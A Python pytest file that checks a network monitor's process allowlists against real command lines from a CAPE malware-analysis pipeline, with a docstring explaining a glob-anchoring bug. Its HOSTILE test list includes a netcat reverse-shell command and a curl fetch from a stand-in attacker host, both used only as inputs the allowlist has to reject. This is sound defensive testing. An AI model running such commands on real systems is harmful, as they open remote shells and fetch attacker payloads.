# Copyright 2026 Christopher Shaiman
# SPDX-License-Identifier: Apache-2.0
"""The process allowlists must match the processes the platform actually runs.

`network-monitor` alerts on any process owned by cape/pipeline/lamware-api that
no allowlist pattern matches. Nothing tested those patterns, and five of them
could never match anything:

    'podman'  'podman run --rm*'  'podman build*'  'conmon*'  'catatonit*'

`ps -o args=` reports the ABSOLUTE path and the patterns anchor at the start of
the string, so `/usr/bin/conmon …` was never going to match `conmon*`. They read
as coverage and provided none. Measured in the deployed monitor's own log: 1430
conmon and 1440 fuse-overlayfs alerts, plus every analysis stage wrapper —
`/bin/bash /opt/*/run-*` was absent entirely, so a pipeline run alerted
repeatedly for doing its job.

That is the same defect class as the dead fail2ban filter (#435) and the
correlation rule with no inputs (#436): a control that cannot fire, reporting as
one that found nothing. Here it inverted — the control fired constantly on
legitimate work, which is how an alert channel gets muted, and a muted channel
is a dead control with extra steps.

The corpus below is REAL: command lines taken from the deployed host's
network-monitor log and from `ps` during a live pipeline run, not invented.
"""
import re
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
MONITOR = (ROOT / "ansible" / "roles" / "network-monitor" / "templates"
           / "network-monitor.sh.j2").read_text(encoding="utf-8")


def _patterns(array_name: str) -> list[str]:
    """The single-quoted entries of a `NAME=( ... )` bash array."""
    m = re.search(rf"^{array_name}=\((.*?)^\)", MONITOR, re.S | re.M)
    assert m, f"{array_name} not found — the parser needs updating, not deleting"
    body = "\n".join(ln for ln in m.group(1).splitlines()
                     if not ln.strip().startswith("#"))
    pats = re.findall(r"'([^']*)'", body)
    assert pats, f"{array_name} parsed to nothing"
    return pats


def _matches(cmdline: str, patterns: list[str]) -> str | None:
    """fnmatch stands in for bash `case`; both are glob, and `*` spans `/`."""
    from fnmatch import fnmatchcase
    for p in patterns:
        if fnmatchcase(cmdline, p):
            return p
    return None


# Command lines observed on the deployed host. Truncated only where a hash or a
# path list ran long; the leading portion is what the patterns anchor on.
PIPELINE_REAL = [
    "/opt/pipeline/venv/bin/python /opt/pipeline/run-pipeline.py /opt/pipeline/verify/25d18a2b.exe",
    "/bin/bash /usr/local/bin/run-pipeline /opt/pipeline/verify/25d18a2b.exe --task-id verify",
    # Dump path is Cape's storage now, not a ramdisk copy (#470). The pattern
    # these anchor on is '/bin/bash /opt/*/run-*', which matches the wrapper and
    # ignores its arguments, so the change could not break the allowlist — but
    # these lines claim to be observed command lines, so they should be true.
    "/bin/bash /opt/volatility3/run-volatility /opt/CAPEv2/storage/analyses/1047/memory.dmp windows.malfind",
    "/bin/bash /opt/volatility3/run-volatility /opt/CAPEv2/storage/analyses/1047/memory.dmp windows.netscan",
    "/bin/bash /opt/ghidra/run-ghidra /opt/CAPEv2/storage/analyses/1030/files/4b07 /opt/pipeline/reports/x",
    "/bin/bash /opt/interpret/run-interpret",
    "/bin/bash /opt/triage/run-triage /opt/pipeline/verify/25d18a2b.exe",
    "/bin/bash /opt/pcap-analysis/run-pcap-analysis /opt/pipeline/reports/x/dump.pcap",
    "/bin/bash /opt/screenshot-analysis/run-screenshot-analysis /opt/pipeline/reports/x",
    "/bin/bash /opt/pdf-generation/run-pdf-generation /opt/pipeline/reports/x",
    "/usr/bin/conmon --api-version 1 -c 03def53235bb9bf92e78fbdc86b751e0ce085e1bf82bea22a576fd7",
    "/usr/bin/fuse-overlayfs -o lowerdir=/home/pipeline/.local/share/containers/storage/overlay",
    "/usr/bin/podman run --rm --network=none ghidra-analysis",
    "/usr/lib/systemd/systemd --user --deserialize=8",
    "(sd-pam)",
]


@pytest.mark.parametrize("cmdline", PIPELINE_REAL)
def test_every_real_pipeline_process_is_allowlisted(cmdline):
    """THE regression. Each of these alerted on the deployed host."""
    pats = _patterns("pipeline_patterns")
    assert _matches(cmdline, pats), (
        f"no pattern matches a process the pipeline genuinely runs:\n  {cmdline}\n"
        f"every analysis would alert on it, five minutes apart, until someone "
        f"muted the channel")


CAPE_REAL = [
    "/usr/bin/conmon --api-version 1 -c 892ab20935c1b6d5d23c787d24864a570ef2387974083de75298",
    "/usr/bin/podman run --rm cape-processor",
]


@pytest.mark.parametrize("cmdline", CAPE_REAL)
def test_the_cape_allowlist_has_the_same_entries(cmdline):
    """The cape list carried the identical dead patterns."""
    assert _matches(cmdline, _patterns("cape_patterns")), cmdline


# --- the allowlist must still refuse things ------------------------------

HOSTILE = [
    "/tmp/attacker/conmon --evil",
    "/tmp/podman run --rm evil",
    "/home/pipeline/podman",
    "/opt/evil/run-backdoor",
    "/usr/bin/nc -e /bin/sh 10.0.0.1 4444",
    "curl http://evil.example/x.sh",
    "/bin/bash -i",
]


@pytest.mark.parametrize("cmdline", HOSTILE)
@pytest.mark.parametrize("array", ["pipeline_patterns", "cape_patterns"])
def test_the_allowlist_still_refuses_hostile_processes(array, cmdline):
    """The fix widened coverage; it must not have widened it to everything.
    `*/conmon*` would have matched /tmp/attacker/conmon — hence /usr/bin."""
    hit = _matches(cmdline, _patterns(array))
    assert hit is None, f"{array} allows {cmdline!r} via pattern {hit!r}"


def test_the_bare_podman_supervisor_is_still_allowlisted():
    """A correction to this file's own premise, kept as a test.

    The first version of the fix deleted the bare `podman` entries on the
    reasoning that `ps -o args=` always reports an absolute path. It does not:
    rootless podman rewrites argv[0], so its supervisor process reports the
    literal string `podman`, and one exists for both the pipeline and cape users
    right now. Deleting those entries would have introduced a NEW false positive
    while fixing an old one.

    So the lists carry both spellings. What was actually dead was `conmon*` and
    friends, whose processes only ever appear as /usr/bin/…
    """
    for array in ("pipeline_patterns", "cape_patterns"):
        assert _matches("podman", _patterns(array)), (
            f"{array} no longer matches rootless podman's bare supervisor")


def test_the_dead_spelling_is_now_covered_too():
    """The half that genuinely was dead."""
    for array in ("pipeline_patterns", "cape_patterns"):
        pats = _patterns(array)
        assert _matches("/usr/bin/conmon --api-version 1 -c abc", pats), array
        assert _matches("/usr/bin/fuse-overlayfs -o lowerdir=/home/pipeline/x", pats), array
